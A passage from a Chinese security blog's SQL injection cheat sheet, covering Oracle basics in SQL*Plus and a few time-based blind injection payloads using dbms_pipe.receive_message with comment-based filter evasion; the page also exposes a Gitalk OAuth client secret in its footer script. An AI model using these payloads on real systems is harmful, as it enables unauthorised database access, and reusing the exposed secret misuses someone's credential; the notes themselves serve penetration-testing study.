class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin&gt; sqlplus</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.2.0 Production on 星期四 9月 24 11:54:09 2020</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2014, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">请输入用户名:  sys as sysdba</span><br><span class="line">输入口令:</span><br><span class="line"></span><br><span class="line">连接到:</span><br><span class="line">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">//create user xxxxx(用户名) identified by &quot;密码&quot; </span><br><span class="line">//grant dba to 用户名  --给用户赋予所有权限，connect是赋予连接数据库的权限，resource 是赋予用户只可以创建实体但是没有创建数据结构的权限。</span><br><span class="line"></span><br><span class="line">//切换用户</span><br><span class="line">SQL&gt; conn scott</span><br><span class="line">输入口令: 123456</span><br><span class="line">已连接。</span><br><span class="line"></span><br><span class="line">//查看当前用户==show user</span><br><span class="line">SQL&gt; select user from dual;  </span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SCOTT</span><br><span class="line"></span><br><span class="line">//查看数据库版本</span><br><span class="line">SQL&gt; select product, version from product_component_version where substr(product, 1, 6)=&#x27;Oracle&#x27;; </span><br><span class="line"></span><br><span class="line">PRODUCT</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">VERSION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Oracle Database 11g Express Edition</span><br><span class="line">11.2.0.2.0</span><br><span class="line"></span><br><span class="line">//使用host命令可以执行系统命令</span><br><span class="line">SQL&gt; host whoami</span><br><span class="line">desktop-3o58k0a\admin</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">SQL&gt; create table t_user(id number(10) primary key, name varchar2(20)); </span><br><span class="line"></span><br><span class="line">表已创建。</span><br><span class="line"></span><br><span class="line">//插入</span><br><span class="line">SQL&gt; insert into t_user(id, name) values(1, &#x27;123&#x27;); //必须是单引号？双引号就报错</span><br><span class="line"></span><br><span class="line">已创建 1 行。</span><br><span class="line"></span><br><span class="line">//有更新一定要commit</span><br><span class="line">SQL&gt;COMMIT;</span><br><span class="line"></span><br><span class="line">//查看所有表空间</span><br><span class="line">SQL&gt; select tablespace_name from dba_tablespaces;</span><br><span class="line"></span><br><span class="line">TABLESPACE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SYSTEM</span><br><span class="line">SYSAUX</span><br><span class="line">UNDOTBS1</span><br><span class="line">TEMP</span><br><span class="line">USERS</span><br><span class="line"></span><br><span class="line">//查看当前用户的表</span><br><span class="line">SQL&gt; select table_name from user_tables where rownum &lt; 5;</span><br><span class="line"></span><br><span class="line">TABLE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">ICOL$</span><br><span class="line">IND$</span><br><span class="line">COL$</span><br><span class="line">CLU$</span><br><span class="line"></span><br><span class="line">//延时函数dbms_pipe.receive_message：从rds（可任意命名）管道等待4秒钟</span><br><span class="line">SQL&gt; select dbms_pipe.receive_message(&#x27;rds&#x27;, 4) from dual;</span><br><span class="line"></span><br><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RDS&#x27;,4)</span><br><span class="line">----------------------------------</span><br><span class="line">                                 1</span><br><span class="line">//查询ip地址</span><br><span class="line">SQL&gt; select utl_inaddr.get_host_address from dual;</span><br><span class="line"></span><br><span class="line">GET_HOST_ADDRESS</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">fe80::35db:b13e:5850:3ca3%3</span><br></pre></td></tr></table></figure>
+
+<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值) //作用与if类似</span><br><span class="line">substr(user, 1, 1)</span><br><span class="line">ascii(&#x27;a&#x27;)</span><br><span class="line">dbms_pipe.receive_message(任意管道名, 等待时间)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">time-based</span><br><span class="line">2&#x27;/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(&#x27;f&#x27;,3)=&#x27;f</span><br><span class="line">2&#x27;/**/and/**/(select decode(length(user),6,dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br><span class="line">2&#x27;/**/and/**/(select decode(ascii(substr(user,1,1)), 128, dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/">Oracle注入 - 命令执行&amp;Shell反弹</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/03/reverse-shell-feature-research/" rel="next" title="反弹shell特征研究">
+                <i class="fa fa-chevron-left"></i> 反弹shell特征研究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/22/blindsql-injection-poc/" rel="prev" title="挖洞经历之SQLServer time-based注入">
+                挖洞经历之SQLServer time-based注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+   <div id="gitalk-container"></div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL"><span class="nav-number">1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Server"><span class="nav-number">2.</span> <span class="nav-text">SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">2.1.</span> <span class="nav-text">基本信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-number">2.1.1.</span> <span class="nav-text">权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.2.</span> <span class="nav-text">数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-1"><span class="nav-number">2.1.3.</span> <span class="nav-text">语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload"><span class="nav-number">2.1.4.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SqlServer-getshell"><span class="nav-number">2.2.</span> <span class="nav-text">SqlServer getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LOG%E5%A4%87%E4%BB%BD"><span class="nav-number">2.2.1.</span> <span class="nav-text">LOG备份</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD"><span class="nav-number">2.2.2.</span> <span class="nav-text">差异备份</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">2.4.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oralce"><span class="nav-number">3.</span> <span class="nav-text">Oralce</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="nav-number">3.1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-2"><span class="nav-number">3.2.</span> <span class="nav-text">语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payloads"><span class="nav-number">3.3.</span> <span class="nav-text">Payloads</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">欣海余诚</span>
+
+  
+</div>
+
+
+  <!--  <div class="powered-by">
+  由 <a class="theme-link" target="_blank" href="http    s://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+  <div class="theme-info">
+主题 &mdash;
+  <a class="theme-link" target="_blank" href="https://github.com/iissnan/he    xo-theme-next"></div>
+
+<br/>
+<!-- 不蒜子统计 -->
+    <span id="busuanzi_container_site_pv">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+            本站访客数<span id="busuanzi_value_site_uv"></span>人
+    </span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '1fff4b96b35fa3febf47',
+          clientSecret: '1ac2f8d73e01cdd9286e7f6d3a78cbd5a1700f33',
+          repo: 'xhycccc.github.io',
+          owner: 'xhycccc',
+          admin: ['xhycccc'],
+          id: location.pathname,
+          distractionFreeMode: 'false'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
